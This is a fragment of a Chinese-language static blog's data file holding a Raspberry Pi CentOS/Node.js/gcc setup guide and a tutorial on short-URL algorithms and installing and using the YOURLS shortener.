class=\"bash\"> 切换目录</span></span><br><span class=\"line\">cd /usr/local/build/gcc-6.1.0</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 调用gcc源程序的configure(后面的参数选项可根据需要自行修改)，用于配置gcc</span></span><br><span class=\"line\">如果报：gnu/stubs-soft.h: No such file or directory，执行以下语句</span><br><span class=\"line\">/usr/local/src/gcc-6.1.0/configure --enable-checking=release --enable-languages=c,c++ --disable-multilib --with-float=hard</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 编译gcc源程序</span></span><br><span class=\"line\">make</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 安装gcc</span></span><br><span class=\"line\">make install</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看 gcc版本</span></span><br><span class=\"line\">gcc --version</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如果发现gcc版本还是之前的。可直接进行以下操作不影响node环境运行。</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看当前so库信息</span></span><br><span class=\"line\">strings /usr/lib/libstdc++.so.6 | grep GLIBC</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查找系统内是否存在其他版本的so库文件</span></span><br><span class=\"line\">find / -name libstdc++.so.6*</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 根据搜索版本进行拷贝</span></span><br><span class=\"line\">cp /usr/local/lib/libstdc++.so.6.0.22 /usr/lib</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 删除软链接（切记不要删除之前的so库文件）</span></span><br><span class=\"line\">rm -rf /usr/lib/libstdc++.so.6</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 新建软链接</span></span><br><span class=\"line\">ln -s /usr/lib/libstdc++.so.6.0.22 /usr/lib/libstdc++.so.6</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"gcc更新参考\"><a href=\"#gcc更新参考\" class=\"headerlink\" title=\"gcc更新参考\"></a>gcc更新参考</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;bbs.huaweicloud.com&#x2F;forum&#x2F;thread-20440-1-1.html</span><br><span class=\"line\">https:&#x2F;&#x2F;www.colabug.com&#x2F;2020&#x2F;0607&#x2F;7439328&#x2F;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/pi4-labelled.jpg\" alt=\"pi4-labelled\"></p>\n<h4 id=\"Centos下载\"><a href=\"#Centos下载\" class=\"headerlink\" title=\"Centos下载\"></a>Centos下载</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">链接内包含支持树莓派centos系统（这里我选择字符）</span><br><span class=\"line\">http:&#x2F;&#x2F;mirror.nyherji.is&#x2F;centos-altarch&#x2F;7.8.2003&#x2F;isos&#x2F;armhfp&#x2F;</span><br><span class=\"line\">RaspberryPI-GNOME\t\t\t图形</span><br><span class=\"line\">RaspberryPI-KDE\t\t\t\t图形</span><br><span class=\"line\">RaspberryPI-Minimal\t\t字符</span><br></pre></td></tr></table></figure>\n\n<p>下载解压得到</p>\n<p><code>CentOS-Userland-7-armv7hl-RaspberryPI-Minimal-1810-sda.raw</code></p>\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908154046290.png\" alt=\"image-20200908154046290\"></p>\n<h4 id=\"TF格式化\"><a href=\"#TF格式化\" class=\"headerlink\" title=\"TF格式化\"></a>TF格式化</h4><p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908154105219.png\" alt=\"image-20200908154105219\"></p>\n<h4 id=\"iOS写入\"><a href=\"#iOS写入\" class=\"headerlink\" title=\"iOS写入\"></a>iOS写入</h4><p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908154019220.png\" alt=\"image-20200908154019220\"></p>\n<h4 id=\"内存卡剩余空间\"><a href=\"#内存卡剩余空间\" class=\"headerlink\" title=\"内存卡剩余空间\"></a>内存卡剩余空间</h4><p>df  -h</p>\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908162605423.png\" alt=\"image-20200908162605423\"></p>\n<p>一行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;rootfs-expand</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908162627706.png\" alt=\"image-20200908162627706\"></p>\n<h4 id=\"树莓派安装docker\"><a href=\"#树莓派安装docker\" class=\"headerlink\" title=\"树莓派安装docker\"></a>树莓派安装docker</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">参考：</span><br><span class=\"line\">https://raspberrypi.stackexchange.com/questions/85654/installing-docker-on-rpi-3b-with-centos</span><br><span class=\"line\">sudo yum install docker -y</span><br><span class=\"line\">systemctl start docker</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200921094330236.png\" alt=\"image-20200921094330236\"></p>\n<h4 id=\"树莓派配置yum源\"><a href=\"#树莓派配置yum源\" class=\"headerlink\" title=\"树莓派配置yum源\"></a>树莓派配置yum源</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/yum.repos.d/epel.repo</span><br><span class=\"line\"></span><br><span class=\"line\">[epel]</span><br><span class=\"line\">name=Extra Packages for Enterprise Linux 7</span><br><span class=\"line\">baseurl=http://ftp.sjtu.edu.cn/fedora/epel/7/aarch64/</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum update</span><br></pre></td></tr></table></figure>\n\n<p>树莓派安装nodejs</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 先安装nvm</span></span><br><span class=\"line\">git clone https://github.com/creationix/nvm.git</span><br><span class=\"line\">source nvm/nvm.sh</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> nvm安装nodejs，版本14.11.0</span></span><br><span class=\"line\">nvm install 14.11.0</span><br></pre></td></tr></table></figure>\n\n<p>如出现以下报错</p>\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200922144343526.png\" alt=\"image-20200922144343526\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如镜像源无法检索到此so库文件，可更换以上yum源</span></span><br><span class=\"line\">yum install libatomic -y</span><br></pre></td></tr></table></figure>\n\n<p>如出现以下报错，说明gcc动态库版本较低</p>\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200922144613897.png\" alt=\"image-20200922144613897\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;itbilu.com&#x2F;linux&#x2F;management&#x2F;NymXRUieg.html</span><br><span class=\"line\"># 官方对比gcc版本信息，并进行下载</span><br><span class=\"line\">https:&#x2F;&#x2F;gcc.gnu.org&#x2F;onlinedocs&#x2F;libstdc++&#x2F;manual&#x2F;abi.html</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings &#x2F;usr&#x2F;lib&#x2F;libstdc++.so.6 | grep GLIBCXX</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"gcc更新\"><a href=\"#gcc更新\" class=\"headerlink\" title=\"gcc更新\"></a>gcc更新</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> gcc版本查看</span></span><br><span class=\"line\">gcc --version</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载对应版本</span></span><br><span class=\"line\">wget https://ftp.gnu.org/gnu/gcc/gcc-6.1.0/gcc-6.1.0.tar.gz</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum提前安装部分插件</span></span><br><span class=\"line\">yum install -y glibc-static libstdc++-static</span><br><span class=\"line\">yum install gcc gcc-c++</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 解压到指定目录下</span></span><br><span class=\"line\">tar -xvf gcc-6.1.0.tar.bz2 -C /usr/local/src</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 切换目录</span></span><br><span class=\"line\">cd /usr/local/src/gcc-6.1.0</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载一些必备的依赖程序</span></span><br><span class=\"line\">./contrib/download_prerequisites</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 依赖文件n</span></span><br><span class=\"line\">yum install gmp、mpfr、mpc</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 编译前，创建文件夹</span></span><br><span class=\"line\">mkdir /usr/local/build/gcc-6.1.0</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 切换目录</span></span><br><span class=\"line\">cd /usr/local/build/gcc-6.1.0</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 调用gcc源程序的configure(后面的参数选项可根据需要自行修改)，用于配置gcc</span></span><br><span class=\"line\">如果报：gnu/stubs-soft.h: No such file or directory，执行以下语句</span><br><span class=\"line\">/usr/local/src/gcc-6.1.0/configure --enable-checking=release --enable-languages=c,c++ --disable-multilib --with-float=hard</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 编译gcc源程序</span></span><br><span class=\"line\">make</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 安装gcc</span></span><br><span class=\"line\">make install</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看 gcc版本</span></span><br><span class=\"line\">gcc --version</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如果发现gcc版本还是之前的。可直接进行以下操作不影响node环境运行。</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看当前so库信息</span></span><br><span class=\"line\">strings /usr/lib/libstdc++.so.6 | grep GLIBC</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查找系统内是否存在其他版本的so库文件</span></span><br><span class=\"line\">find / -name libstdc++.so.6*</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 根据搜索版本进行拷贝</span></span><br><span class=\"line\">cp /usr/local/lib/libstdc++.so.6.0.22 /usr/lib</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 删除软链接（切记不要删除之前的so库文件）</span></span><br><span class=\"line\">rm -rf /usr/lib/libstdc++.so.6</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 新建软链接</span></span><br><span class=\"line\">ln -s /usr/lib/libstdc++.so.6.0.22 /usr/lib/libstdc++.so.6</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"gcc更新参考\"><a href=\"#gcc更新参考\" class=\"headerlink\" title=\"gcc更新参考\"></a>gcc更新参考</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;bbs.huaweicloud.com&#x2F;forum&#x2F;thread-20440-1-1.html</span><br><span class=\"line\">https:&#x2F;&#x2F;www.colabug.com&#x2F;2020&#x2F;0607&#x2F;7439328&#x2F;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"短链学习与实践","date":"2020-05-16T09:43:17.000Z","_content":"短链(Short URL)即为短网址,主要包含域名加部分字符(这类字符中包含指定的数字或a-z、A-Z、0-9随机生成的字符),因其较短而无需冗长的链接,同时也帮助我们解决了因字符长度限制而闻名.\n\n## 原理\n当浏览器中输入:```http://yourls.me:4444/1```时.\n* DNS首先解析获得的 ```http://yourls.me:4444 ```IP地址\n* 当 DNS获得IP地址以后（比如：192.168.3.12）,会向这个地址发送 HTTP GET 请求，查询短码\"1\".\n* ```http://yourls.me:4444``` 服务器会通过短码“1”获取对应的长 URL\n* 请求通过 HTTP 301 转到对应的长 URL ```http://www.si1ent.xyz/2019/03/05/hello-world/```\n\n### 短链作用\n* 缩短原链接长度，便于营销推广\n* 数据统计，在重定向的过程中进行PV、UV等数据统计\n* 屏蔽原链接域名\n\n### 301&302\n301 是永久重定向,302 是临时重定向.短地址一经生成就不会变化,所以用 301 是符合 HTTP 语义的.同时对服务器压力也会有一定减少. 但是如果使用了 301,我们就无法统计到短地址被点击的次数了.而这个点击次数是一个非常有意思的大数据分析数据源.能够分析出的东西非常非常多.所以选择302虽然会增加服务器压力.\n## 算法实现\n### 自增算法\n不重复算法:\n设置一个10进制的自增变量x,生成短链接时将其转换为62进制的数值,该数值便作为短链接,下次生成短链接则x+1.该算法运用了低进制转高进制,字符数会变少的原理.\n十进制 2020,对应不同进制的字符表示:\n\n![](/images/short_url/jinzhi.png)\n\n[进制在线转换工具](https://tool.lu/hexconvert/)\n### Hash算法\nMD5消息摘要算法 （英语：MD5 Message-Digest Algorithm）,一种被广泛使用的密码散列函数用于确保信息传输完整一致.MD5 加密后的位数一般为两种,16 位与32 位,这里我们使用32位.\n#### 流程\n\n* 将长网址 md5 生成 32 位签名串,分为 4 段,每段 8 个字节.\n* 对这四段循环处理, 取 8 个字节,将他看成 16 进制串与 0x3fffffff(30位1) 与操作,即超过 30 位的忽略处理.\n* 这 30 位分成 6 段,每 5 位的数字作为字母表的索引取得特定字符,依次进行获得 6 位字符串.\n* 总的 md5 串可以获得4个6位串,取里面的任意一个就可作为这个长 url 的短URL地址.\n\n## YOURLS介绍\nYOURLS (Your Own URL Shortener) 一款开源PHP程序,实现短网址生成系统.而无需第三方平台你就可以获得所有的数据统计,并且支持一系列插件扩展<可单独写>.\n[官网](https://yourls.org/)\n[Github项目](https://github.com/YOURLS/YOURLS)\n\n### YOURLS特点\n* 安装简单\n* 私有或公共均可\n* 支持默认的数字顺序、指定关键字两种方式生成.\n* 轻松创建和分享链接\n* 历史点击报告、来源追踪、访客地理位置\n* 支持API\n\n## YOURLS搭建\n### 环境准备\n* LAMP/LNMP环境WAMP等均可\n* YOURLS源码\n\n### 源码下载\n[YOURLS](https://github.com/YOURLS/YOURLS)\n\n### 配置文档\nYOURLS配置文档在user目录下的config-sample.php内,提前拷贝并修改文件为config.php.\n\n![](/images/short_url/config.png)\n```PHP\ndefine( 'YOURLS_DB_USER', 'root' ); //数据库账户\ndefine( 'YOURLS_DB_PASS', '123456' ); //数据库密码\ndefine( 'YOURLS_DB_NAME', 'yourls' ); //YOURLS数据库名\ndefine( 'YOURLS_DB_HOST', 'localhost' ); //数据库地址\ndefine( 'YOURLS_DB_PREFIX', 'yourls_' ); //数据库前缀\ndefine( 'YOURLS_SITE', 'http://yourls.me:4444' );//服务器域名,短地址也是基于这个生成,一定不能写错,不然会报错.\ndefine( 'YOURLS_HOURS_OFFSET', '+8'); 　　　//时区偏移,默认即可.\ndefine( 'YOURLS_LANG', 'zh_CN' ); 　　　　　//默认为英文,没有中文包,需要自己去 https://github.com/guox/yourls-zh_CN/下载,放到user/languages目录下\ndefine( 'YOURLS_UNIQUE_URLS', true );　　　//短地址是否唯一\ndefine( 'YOURLS_PRIVATE', true ); //是否私有,如果私有的,在进行api调用生成短地址时需要传递用户名和密码(默认即可)\ndefine( 'YOURLS_COOKIEKEY', 'A2C7&H~r80pTps{nIfI8VFpTxnfF3c)j@J#{nDUh' );//加密cookie 去 http://yourls.org/cookie 获取\n$yourls_user_passwords = array( 'admin' => '123456' /* Password encrypted by YOURLS */; //用户名=>密码 可填多个 登录成功后这里的明文密码会被加密 );\ndefine( 'YOURLS_DEBUG', false );　　　　　　//是否开启调试\ndefine( 'YOURLS_URL_CONVERT', 62 );　　　　//使用36进制 还是62进制 这个最好一开始设好不要修改，避免地址冲突，建议62进制\n$yourls_reserved_URL = array( 'porn', 'faggot', 'sex', 'nigger', 'fuck', 'cunt', 'dick', //排除一下短地址，这些地址是不会生成的 );\n```\n- **访问提醒数据库**\n\n注意:须提前新建数据库,不然会报错.\n```PHP\nhttp://yourls.me:4444/admin/\n```\n![](/images/short_url/db_error.png)\n\n<center>先新建数据库</center>\n- **新建数据库**\n\n![](/images/short_url/create_yourls.png)\n\n- **Install**\n\n新建数据库后刷新网页即可显示如下图所示:\n![](/images/short_url/install.png)\n默认生成文件及表等信息.\n![](/images/short_url/success_.png)\n\n- **系统登录**\n\n可登录多个账户(配置文件中添加).\n![](/images/short_url/login.png)\n![](/images/short_url/login_index.png)\n- **新建短链**\n\n输入长链和关键字,关键字部分可省略,默认会是数字顺序添加.\n![](/images/short_url/url_create.png)\n![](/images/short_url/short_urls.png)\n- **访问实战**\n\n![](/images/short_url/yourls.gif)\n\n## API使用\nyourls 提供了丰富的API,使用自身的API可以实现:\n1. 生成或获取短链\n2. 获取短链的统计信息\n3. 以 JSON, XML 或者纯文本输出\n4. 通过用户名密码或者安全的无密码token机制授权\n介绍配置文件时已经说明,如果想私有,就需要进行签名后才能使用API.\n\n![](/images/short_url/api.png)\n\n```PHP\nhttp://yourls.me:4444/yourls-api.php\n```\n### 参数\n两种方式获得授权,一种是使用 username/password 对发送请求,但这种方式导致用户名密码在传输过程中被截取泄露;另一种方式是使用不需要密码的 token 机制,在 admin/tools.php 页面会产生当前用户的验证token;\n动作 action 参数有很多个选项:\n* shorturl 获取链接的短链接\n在使用了值之后，另外两个参数\n\n```PHP\n- `url` 用来缩短的原始链接\n- `keyword` 或者 `title` 可选参数，用来自定义短链接\n```\n* expand 获取短链接的原始长链接\n将短链接展开\n\n```PHP\n- `shorturl` 值可以为 `abc` 或者完整的短链接\n```\n* url-stats 获取短链接的信息\n短链接的统计信息\n\n```PHP\n- `shorturl` 值可以为 `abc` 或者完整的短链接\n```\n* stats 获取链接的信息\n获取链接的信息\n\n```PHP\n- `filter` 值可以为 `top`, `bottom`, `rand`, `last`\n- `limit` 返回的数量\n```\n* db-stats 获取全局的链接和点击数\n\n* 输出格式 format 参数用来指定API输出的格式\n\n```PHP\njsonp\njson\nxml\nsimple\n```\n### API生成短链\n```BASH\ncurl -X POST \\\nhttp://yourls.me:4444/yourls-api.php \\\n-F signature=3f5bd1d9a2 \\\n-F action=shorturl \\\n-F url=http://www.si1ent.xyz/2020/05/16/index.html \\\n-F format=json\n```\n![](/images/short_url/curl.png)\n\n## 参考\n```PHP\nhttps://hufangyun.com/2017/short-url/\nhttps://www.jianshu.com/p/d7c1edc0836e\n```","source":"_posts/短链学习与实践.md","raw":"---\ntitle: 短链学习与实践\ndate: 2020-05-16 17:43:17\ntags:\n - YOURLS\n---\n短链(Short URL)即为短网址,主要包含域名加部分字符(这类字符中包含指定的数字或a-z、A-Z、0-9随机生成的字符),因其较短而无需冗长的链接,同时也帮助我们解决了因字符长度限制而闻名.\n\n## 原理\n当浏览器中输入:```http://yourls.me:4444/1```时.\n* DNS首先解析获得的 ```http://yourls.me:4444 ```IP地址\n* 当 DNS获得IP地址以后（比如：192.168.3.12）,会向这个地址发送 HTTP GET 请求，查询短码\"1\".\n* ```http://yourls.me:4444``` 服务器会通过短码“1”获取对应的长 URL\n* 请求通过 HTTP 301 转到对应的长 URL ```http://www.si1ent.xyz/2019/03/05/hello-world/```\n\n### 短链作用\n* 缩短原链接长度，便于营销推广\n* 数据统计，在重定向的过程中进行PV、UV等数据统计\n* 屏蔽原链接域名\n\n### 301&302\n301 是永久重定向,302 是临时重定向.短地址一经生成就不会变化,所以用 301 是符合 HTTP 语义的.同时对服务器压力也会有一定减少. 但是如果使用了 301,我们就无法统计到短地址被点击的次数了.而这个点击次数是一个非常有意思的大数据分析数据源.能够分析出的东西非常非常多.所以选择302虽然会增加服务器压力.\n## 算法实现\n### 自增算法\n不重复算法:\n设置一个10进制的自增变量x,生成短链接时将其转换为62进制的数值,该数值便作为短链接,下次生成短链接则x+1.该算法运用了低进制转高进制,字符数会变少的原理.\n十进制 2020,对应不同进制的字符表示:\n\n![](/images/short_url/jinzhi.png)\n\n[进制在线转换工具](https://tool.lu/hexconvert/)\n### Hash算法\nMD5消息摘要算法 （英语：MD5 Message-Digest Algorithm）,一种被广泛使用的密码散列函数用于确保信息传输完整一致.MD5 加密后的位数一般为两种,16 位与32 位,这里我们使用32位.\n#### 流程\n\n* 将长网址 md5 生成 32 位签名串,分为 4 段,每段 8 个字节.\n* 对这四段循环处理, 取 8 个字节,将他看成 16 进制串与 0x3fffffff(30位1) 与操作,即超过 30 位的忽略处理.\n* 这 30 位分成 6 段,每 5 位的数字作为字母表的索引取得特定字符,依次进行获得 6 位字符串.\n* 总的 md5 串可以获得4个6位串,取里面的任意一个就可作为这个长 url 的短URL地址.\n\n## YOURLS介绍\nYOURLS (Your Own URL Shortener) 一款开源PHP程序,实现短网址生成系统.而无需第三方平台你就可以获得所有的数据统计,并且支持一系列插件扩展<可单独写>.\n[官网](https://yourls.org/)\n[Github项目](https://github.com/YOURLS/YOURLS)\n\n### YOURLS特点\n* 安装简单\n* 私有或公共均可\n* 支持默认的数字顺序、指定关键字两种方式生成.\n* 轻松创建和分享链接\n* 历史点击报告、来源追踪、访客地理位置\n* 支持API\n\n## YOURLS搭建\n### 环境准备\n* LAMP/LNMP环境WAMP等均可\n* YOURLS源码\n\n### 源码下载\n[YOURLS](https://github.com/YOURLS/YOURLS)\n\n### 配置文档\nYOURLS配置文档在user目录下的config-sample.php内,提前拷贝并修改文件为config.php.\n\n![](/images/short_url/config.png)\n```PHP\ndefine( 'YOURLS_DB_USER', 'root' ); //数据库账户\ndefine( 'YOURLS_DB_PASS', '123456' ); //数据库密码\ndefine( 'YOURLS_DB_NAME', 'yourls' ); //YOURLS数据库名\ndefine( 'YOURLS_DB_HOST', 'localhost' ); //数据库地址\ndefine( 'YOURLS_DB_PREFIX', 'yourls_' ); //数据库前缀\ndefine( 'YOURLS_SITE', 'http://yourls.me:4444' );//服务器域名,短地址也是基于这个生成,一定不能写错,不然会报错.\ndefine( 'YOURLS_HOURS_OFFSET', '+8'); 　　　//时区偏移,默认即可.\ndefine( 'YOURLS_LANG', 'zh_CN' ); 　　　　　//默认为英文,没有中文包,需要自己去 https://github.com/guox/yourls-zh_CN/下载,放到user/languages目录下\ndefine( 'YOURLS_UNIQUE_URLS', true );　　　//短地址是否唯一\ndefine( 'YOURLS_PRIVATE', true ); //是否私有,如果私有的,在进行api调用生成短地址时需要传递用户名和密码(默认即可)\ndefine( 'YOURLS_COOKIEKEY', 'A2C7&H~r80pTps{nIfI8VFpTxnfF3c)j@J#{nDUh' );//加密cookie 去 http://yourls.org/cookie 获取\n$yourls_user_passwords = array( 'admin' => '123456' /* Password encrypted by YOURLS */; //用户名=>密码 可填多个 登录成功后这里的明文密码会被加密 );\ndefine( 'YOURLS_DEBUG', false );　　　　　　//是否开启调试\ndefine( 'YOURLS_URL_CONVERT', 62 );　　　　//使用36进制 还是62进制 这个最好一开始设好不要修改，避免地址冲突，建议62进制\n$yourls_reserved_URL = array( 'porn', 'faggot', 'sex', 'nigger', 'fuck', 'cunt', 'dick', //排除一下短地址，这些地址是不会生成的 );\n```\n- **访问提醒数据库**\n\n注意:须提前新建数据库,不然会报错.\n```PHP\nhttp://yourls.me:4444/admin/\n```\n![](/images/short_url/db_error.png)\n\n<center>先新建数据库</center>\n- **新建数据库**\n\n![](/images/short_url/create_yourls.png)\n\n- **Install**\n\n新建数据库后刷新网页即可显示如下图所示:\n![](/images/short_url/install.png)\n默认生成文件及表等信息.\n![](/images/short_url/success_.png)\n\n- **系统登录**\n\n可登录多个账户(配置文件中添加).\n![](/images/short_url/login.png)\n![](/images/short_url/login_index.png)\n- **新建短链**\n\n输入长链和关键字,关键字部分可省略,默认会是数字顺序添加.\n![](/images/short_url/url_create.png)\n![](/images/short_url/short_urls.png)\n- **访问实战**\n\n![](/images/short_url/yourls.gif)\n\n## API使用\nyourls 提供了丰富的API,使用自身的API可以实现:\n1. 生成或获取短链\n2. 获取短链的统计信息\n3. 以 JSON, XML 或者纯文本输出\n4. 通过用户名密码或者安全的无密码token机制授权\n介绍配置文件时已经说明,如果想私有,就需要进行签名后才能使用API.\n\n![](/images/short_url/api.png)\n\n```PHP\nhttp://yourls.me:4444/yourls-api.php\n```\n### 参数\n两种方式获得授权,一种是使用 username/password 对发送请求,但这种方式导致用户名密码在传输过程中被截取泄露;另一种方式是使用不需要密码的 token 机制,在 admin/tools.php 页面会产生当前用户的验证token;\n动作 action 参数有很多个选项:\n* shorturl 获取链接的短链接\n在使用了值之后，另外两个参数\n\n```PHP\n- `url` 用来缩短的原始链接\n- `keyword` 或者 `title` 可选参数，用来自定义短链接\n```\n* expand 获取短链接的原始长链接\n将短链接展开\n\n```PHP\n- `shorturl` 值可以为 `abc` 或者完整的短链接\n```\n* url-stats 获取短链接的信息\n短链接的统计信息\n\n```PHP\n- `shorturl` 值可以为 `abc` 或者完整的短链接\n```\n* stats 获取链接的信息\n获取链接的信息\n\n```PHP\n- `filter` 值可以为 `top`, `bottom`, `rand`, `last`\n- `limit` 返回的数量\n```\n* db-stats 获取全局的链接和点击数\n\n* 输出格式 format 参数用来指定API输出的格式\n\n```PHP\njsonp\njson\nxml\nsimple\n```\n### API生成短链\n```BASH\ncurl -X POST \\\nhttp://yourls.me:4444/yourls-api.php \\\n-F signature=3f5bd1d9a2 \\\n-F action=shorturl \\\n-F url=http://www.si1ent.xyz/2020/05/16/index.html \\\n-F format=json\n```\n![](/images/short_url/curl.png)\n\n## 参考\n```PHP\nhttps://hufangyun.com/2017/short-url/\nhttps://www.jianshu.com/p/d7c1edc0836e\n```","slug":"短链学习与实践","published":1,"updated":"2020-10-23T03:28:27.103Z","_id":"ckglobhe7000yb1hqd4yhf0av","comments":1,"layout":"post","photos":[],"link":"","content":"<p>短链(Short URL)即为短网址,主要包含域名加部分字符(这类字符中包含指定的数字或a-z、A-Z、0-9随机生成的字符),因其较短而无需冗长的链接,同时也帮助我们解决了因字符长度限制而闻名.</p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>当浏览器中输入:<code>http://yourls.me:4444/1</code>时.</p>\n<ul>\n<li>DNS首先解析获得的 <code>http://yourls.me:4444 </code>IP地址</li>\n<li>当 DNS获得IP地址以后（比如：192.168.3.12）,会向这个地址发送 HTTP GET 请求，查询短码”1”.</li>\n<li><code>http://yourls.me:4444</code> 服务器会通过短码“1”获取对应的长 URL</li>\n<li>请求通过 HTTP 301 转到对应的长 URL <code>http://www.si1ent.xyz/2019/03/05/hello-world/</code></li>\n</ul>\n<h3 id=\"短链作用\"><a href=\"#短链作用\" class=\"headerlink\" 